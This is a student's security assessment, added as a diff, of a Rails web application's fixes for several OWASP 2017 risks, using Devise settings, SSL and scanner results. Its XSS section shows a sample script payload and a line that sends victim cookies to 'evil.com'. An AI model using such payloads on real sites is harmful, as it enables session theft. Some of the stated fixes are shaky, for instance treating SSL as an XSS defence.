@@ -1,3 +1,149 @@
+Week# 10: Security Assessment
+1. A2:2017 - Broken Authentication
+What is it?
+Most of the current websites require users and password to login access to their
+accounts. When a visitor enters in a website and sign in, the site will generate a unique
+session ID. It's important to encrypt this information because it's possible for someone
+to intercept a visitor session ID or credentials to do some attacks. Also, the weakness of
+the password (123456, password, Password1...) may result in a simple sign up with an
+admin account with for example the brute-force attack. Finally, another problem may
+occur when the session timeout isn’t set properly, if the user didn't select the ''logout''
+and only close the tab, an attacker uses the browser after some time and is still login.
+What could happen if the vulnerability if not corrected?
+The broken authentication could result in an attacker impersonating a valid user. With
+this information, the attackers gain access to account and need just one admin account
+to compromise the system. On my system, with an admin account, you gain access to
+the admin page. On the admin page, you can add, modify, and delete all the information
+in the database. You gain also access to the intervention page where an attacker could
+send false interventions to the employee through Zendesk. It may result in money
+laundering, social security fraud and identity theft. 
+What I have done to resolve the vulnerability?
+• Use an SSL Certificat : SSL Encryption is used to prevent man-in-the-middle type
+attacks on your site’s sessions, it is important to encrypt the data in transit using an SSL
+certificate. As the name implies, an SSL (secure socket layer) is a digital certificate that
+encrypts information sent between a web server and web browser In the code:
+config.force_ssl = true
+• Enforce Strong Password : Regarding brute force attacks, mentioned earlier in this
+wiki, it’s a good practice to have password requirements for any and all registered users
+on a site (this includes admin accounts, especially!). Strong passwords do not include
+complete words, but rather are a mix of random letters (both uppercase and lowercase),
+numbers, and symbols, so the password can’t be easily guessed. -I Added the gem
+devise_zxcvbn. Password now need to be to the scores number 4 wich mean that the
+estimated time to crack it is about 10^8 seconds. Now password need to have a symbol,
+a capital letter and at least one number. ​config.min_password_score = 4​ 
+-Also, i modified the length of the password to 8 characters
+config.password_length = 8..128​ -To prevent the brute force attack, the maximu
+attempts for an account is set to 20
+config.maximum_attempts = 20
+●Finally, the timeout for session without activity is set to 10 minutes
+config.timeout_in = 10.minutes
+
+2. A3:2017 - Sensitive Data Exposure
+What is it?
+Many web applications and APIs do not properly protect sensitive data, such as
+financial, healthcare, customers name/phone/addres etc. Attackers may steal or modify
+such weakly protected data to conduct credit card fraud, identity theft, or other crimes.
+Sensitive data may be compromised without extra protection, such as encryption at rest
+or in transit, and requires special precautions when exchanged with the browser.
+What could happen if the vulnerability if not corrected?
+The sensitive data exposure may result in a compromise of all data. For my website,
+this data is about all the users, customers and employees information’s (name, phone
+number, email, address etc).
+What I have done to resolve the vulnerability?
+• In devise, I change the secret_key_configuration used by rails for a new one (rails
+secret) • Change the Zendesk url (in the controller) with an ENV variables in
+application.yml • Change the Zendesk email (in the controller) with an ENV variables in
+application.yml • Also, done previously in the applications.yml there are : sengrid, slack,
+twilio, Watson, google_map and credential. • Forces all access to the application over
+SSL (Secure Socket Layer / TLS (Transport Layer Security)) and use secured cookie
+with the ​config.force_ssl
+• In devise.rb, config_secret_key is now an ENV variables in application.yml -The
+credential key is now in application.yml
+
+3. A5:2017 – Broken access control
+What is it?
+Restrictions on what authenticated users can do are often not properly enforced.
+Attackers can exploit these flaws to access unauthorized functionality and/or data, such
+as access other users accounts, view sensitive files, modify other users’ data, change
+access rights, etc
+What could happen if the vulnerability if not corrected?
+The impact is that the attackers acting as users or worst as administrator (in my case)
+and use this privilege for creating, deleting, and updating record in the database. In my
+website, the attacker could have access to all the informations about the customers,
+users, employees, elevators… The page for example Interventions was accessible to all
+with the rocketelevatorsjm/interventions. So, anybody can have access to the
+information about the customers, battery, building…
+What I have done to resolve the vulnerability?
+• I blocked the access to the intervention’s page. If you are not an administrator, you
+cannot have access to this page. • Also, I have checked, blazer and admin section are
+still safe from the broken access control.
+
+4. A7:2017 – Cross-Site Scripting (XSS)
+What is it?
+XSS flaws occurs whenever an application includes untrusted data in a new web page
+without proper validation, escaping or updates an existing web page with user-supplied
+data using a browser API that can create HTML or JavaScript. XSS allows attackers to
+execute scripts in the victim’s browser which can hijack user sessions, deface web
+sites, or redirect the user to malicious sites. 
+What could happen if the vulnerability if not corrected?
+The attacker can read anything vulnerable on the page, insert/remove content, steal
+cookies/sessions, send requests on behalf of the victim. Also, the attacker can send
+with the POST method a script like : ​<script> var xhr = new
+XMLHttpRequest();xhr.open('POST','http://localhost:3001/Users/informations/xss
+_s/',true); </script
+For example, if the victim asks for all the elevators in the DB (GET method), the victim
+browser will have the html <script>…</script> form the attackers. The script could send
+the victim cookies and send it for example to ​http://evil.com/cookie={cookie}
+What I have done to resolve the vulnerability?
+• Forces all access to the application over SSL (Secure Socket Layer / TLS (Transport 
+Layer Security)) and use secured cookie in the production.rb with ​config.force_ssl 
+• Prevents requests who are not from the controllers: ​protect_from_forgery with: 
+:exception 
+5. A9:2017 – Using Components with
+Known Vulnerabilities
+What is it?
+Components, such as libraries, frameworks, and other software modules, run with the 
+same privileges as the application. If a vulnerable component is exploited, such an 
+attack can facilitate serious data loss or server takeover. Applications and APIs using 
+components with known vulnerabilities may undermine application defenses and enable 
+various attacks and impacts. 
+What could happen if the vulnerability if not corrected? 
+While some known vulnerabilities lead to only minor impacts, some of the largest 
+breaches to date have relied on exploiting known vulnerabilities in components. 
+Depending on the assets you are protecting, perhaps this risk should be at the top of 
+the list. 
+What I have done to resolve the vulnerability? 
+●Bundle update so all my gems are now update so the risk decreases 
+●Previously downgrade ruby to 2.6.3 because 2.7.0 could cause a lot of problems 
+with some API 
+●Check that all the gems are used and remove them otherwise 
+●I could pay with FireCloud for a web application firewall (WAF) 
+●In the head of each html_page <%= csrf_meta_tags %>
+
+6. A10:2017 – Insufficient Logging &Monitoring
+What is it?
+In professional environments, logging for traceability of events is important. Insufficient 
+logging and monitoring allow attackers to further attack systems. The insufficient logging 
+compromises are sometimes not detected or detected much too late. On average, it is
+estimated that its take over 7 months for a hacker attack to be detected.
+What could happen if the vulnerability if not corrected?
+Most successful attacks start with vulnerability probing. Allowing such probes to
+continue can raise the likelihood of successful exploit to nearly 100%. Again, theses
+attacks could lead to the steal of data or damage on the database. When you see the
+damage, it is already too late.
+What I have done to resolve the vulnerability?
+●Use the log files in production
+●Modify the logs that are created to be used in a format that can be easily use
+●Retain the logs for a period of time that allows the team to do forensic analysis
+●Evaluate what is the normal traffic on the Rocket Elevator web site
+●What for the multipled failed login attemps
+●Keep an eye on the API
+Annex :
+I have done the static analysis security vulnerability scanner with Brakeman gem : ==
+Overview == Controllers: 6 Models: 15 Templates: 43 Errors: 0 Security
+Warnings: 0
+Also done the OWASP ZAP 2.9.0 (Zed attack proxy) and the result is no red or orange
+flags in the report.
 
  
     
